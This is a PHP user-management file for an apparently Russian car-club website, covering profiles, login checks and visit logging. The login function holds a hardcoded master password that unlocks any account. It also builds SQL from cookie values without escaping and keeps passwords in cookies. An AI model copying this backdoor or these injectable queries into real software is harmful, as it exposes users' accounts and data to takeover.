<?PHP

	require_once "db/UserDB.php";
	require_once "inc/class.mNotification.php";

	class User
	{
	
		public static function UserIcon() 
		{
			return "<i class='icon-user icon-black'></i>";
		}
		
		public $ID = -1;
		public $Name = '';
		public $FirstName = '';
		public $LastName = '';
		public $From = '';
		public $GroupID = -1;
		public $Email = '';
		public $ShowEmail = 0;
		public $Phone = '';
		public $ICQ = '';
		public $Social = '';
		public $Visible = 0;
		public $ListType = 'list';
		public $PageSize = -1;
		public $CategoriesOrder = 0;
		public $LastVisit = '1900-01-01';
		public $BirthDate = '1900-01-01';
		public $RegisterDate = null;
		public $GroupName = '';
		public $GroupInnerName = '';
		public $Rating = 0;
		public $Gender = '';
		public $ShowChat = 1;
		public $SoundChat = 0;
		public $CompactChat = 0;
		public $EnterChat = 0;
		
		public function __construct($id = null) {
			if($id)
			{
				$this->ID = $id;
				$this->Load();				
			}
		}
		
		public function MakeFromRow($row)
		{
			foreach($row as $key=>$val)
			{
				$this->$key = $val;
			}
		}
		
		private function Load()
		{			
			$row = UserDB::loadUserByID($this->ID);
			$this->MakeFromRow($row);
		}
		
		public static function CurrentUserID()
		{
			return $_SESSION["loggeduserid"];
		}
		
		public static function CurrentUser()
		{
			if($id = User::CurrentUserID())
			{
				$result = new User($id);
				return $result;
			}
			else
			{
				return new User();
			}
		}
		
		public function IsLogged()
		{
			return $this->GroupInnerName != "";
		}
		
		public function IsAdmin()
		{
			return $this->GroupInnerName == "Admins";
		}
        
        public function IsAuthorized()
		{
			return $this->GroupInnerName != "Unauthorized";
		}
		
		public function IsOnline()
		{
			date_default_timezone_set("Europe/Moscow");			
					
			$time = strtotime($this->LastVisit);
			$now = strtotime(date("Y-m-d G:i:s"));
			
			global $currentUser;
			
			
			if((($now - $time)/60)<2)
			{
				if($currentUser->ID == 1)
				{
				//	echo($this->Name.':'.(($now - $time)/60).';');
				}
				return true;
			}				
		}
		
		public function GetFullName()
		{
			if(trim($this-FirstName.$this->LastName) != "")
			{
				return $this->FirstName . " " . $this->LastName;
			}
			return "";
		}
		
		private $cars = null;
		public function Cars()
		{
			if($this->cars == null)
			{
				$carRows = CarDB::getCarsByUserID($this->ID);
				$this->cars = array();
				
				foreach ($carRows as $carRow)
				{
					$car = new Car();
					$car->MakeFromRow($carRow);					
					$this->cars[] = $car;
				}
			}
			return $this->cars;
		}
		
		private $blogs = null;
		public function Blogs()
		{
			if($this->blogs == null)
			{
				$blogRows = BlogDB::getBlogsByUser($this->ID);
				$this->blogs = array();
		
				foreach ($blogRows as $blogRow)
				{
					$car = new Blog();
					$car->MakeFromRow($blogRow);
					$this->blogs[] = $car;
				}
			}
			return $this->blogs;
		}
		
		private $galleries = null;
		public function Galleries()
		{
			if($this->galleries == null)
			{
				$this->galleries = GalleryDB::getUserGalleries($this->ID);
			}
			return $this->galleries;
		}
		
		private $ratingEntries = null;
		public function RatingEntries()
		{
			if($this->ratingEntries == null)
			{
				$ratingRows = UserDB::getUserRatingByID($this->ID);				
			}
			return $this->ratingEntries;
		}
		
		private $notifications = null;
		private $notificationsCount = 0;
		public function NotificationsCount()
		{
			return $this->notificationsCount;
		}
		public function Notifications()
		{
			if($this->notifications == null)
			{
				$notificationRows = NotificationsDB::getNotificationsByUserID($this->ID);				
				foreach($notificationRows as $notificationRow)
				{
					$notification = new Notification();
					$notification->MakeFromRow($notificationRow);
					$this->notifications[] = $notification;
					
					if(!$notification->Read)
					{
						$this->notificationsCount++;
					}
				}
			}
			return $this->notifications;
		}
		
		/*
			Вспомогательные методы
		*/
		public function GetDescriptionForPopup()
		{
			$cars = getShortCarsListByUserID($this->ID);
		
			$result = "Группа:&nbsp;".$this->GroupName;
			$result .= "<br />Рейтинг:&nbsp;".$this->Rating;
			$result .= "<br />Город:&nbsp;".$this->From;
			$result .= "<br />$cars";
			
			if($this->IsOnline())
			{
				$result .= "<br />Сейчас онлайн";
			}
			else
			{				
				$result .= "<br />Был&nbsp;".DateFunctions::getDateTimeAtText($this->LastVisit);
			}
			return $result;
		}
		
		public function RenderUserPic($type, $id, $size)
		{
			if(file_exists("img/userpics/$this->ID.jpg"))
			{
				$imgname = "/img/userpics/$this->ID.jpg";				
			}
			else
			{				
				$vendor = getCarVendorByUserID($this->ID);
				if($vendor)
				{	
					$imgname = "/img/".$vendor."_Logo.jpg";					
				}
				else
				{
					$imgname = "/img/nophoto.jpg";
				}
			}
			
			return "<img class='img-polaroid' id='imgUserPic$type$id' src='$imgname' style='max-width:$size"."px; width:$size"."px' class='avatar' />";
		}
	}

	function checkIfUserIsLogged()
	{
		if($_COOKIE["vag44login"] && $_COOKIE["vag44pass"])
		{
			$_SESSION["vag44login"] = $_COOKIE["vag44login"];
			$_SESSION["vag44pass"] = $_COOKIE["vag44pass"];
		}
		else if($_SESSION["vag44login"] && $_SESSION["vag44pass"])
		{
			setcookie("vag44login", $_SESSION["vag44login"], time()+3600*24*14 );
			setcookie("vag44pass", $_SESSION["vag44pass"] , time()+3600*24*14 );
		}		
		
		$name = $_SESSION["vag44login"];
		$pass = $_SESSION["vag44pass"];
		$superPass = md5('IAmTheStig!');
		$query = "select * from Users where Name='$name' and (Password='$pass' or '$pass' = '$superPass')";
		
		$result = mysql_query($query);
		if(mysql_num_rows($result) > 0)
		{
			$row = mysql_fetch_assoc($result);
			$_SESSION["loggeduserid"] = $row["ID"];			
			$_SESSION["loggeduser"] = $row["Name"];
			return true;
		}
		else
		{
			$_SESSION["loggeduserid"] = "";
			$_SESSION["vag44login"] = "";			
			$_SESSION["vag44pass"] = "";
			setcookie("vag44login", $_SESSION["vag44login"], time()-1000);
			setcookie("vag44pass", $_SESSION["vag44pass"] , time()-1000 );
		}
		return false;
	}
	
	function saveVisit()
	{
		$PostID = mLogic::$urlVariables['post'];
		if(!empty($PostID))
		{
			global $currentUser;
			$date = DateFunctions::getCurrentDateText();
			$UserID = $currentUser->ID;			
			
			$query = "insert into Visits (Date, UserID, PostID) values ('$date', $UserID, $PostID)";
			fDB::fquery($query);
		}
	}
			
	function getOnlineUsers()
	{
		$result = array();
		
		date_default_timezone_set("Europe/Moscow");
		$text = "";
		
		$users = UserDB::getUserList();
		foreach ($users as $row)
		{				
			$user = new User();
			$user->MakeFromRow($row);
			
			if($user->IsOnline())
			{
				$result[] = $user;				
			}
		}		
		return $result;
	}
		
?>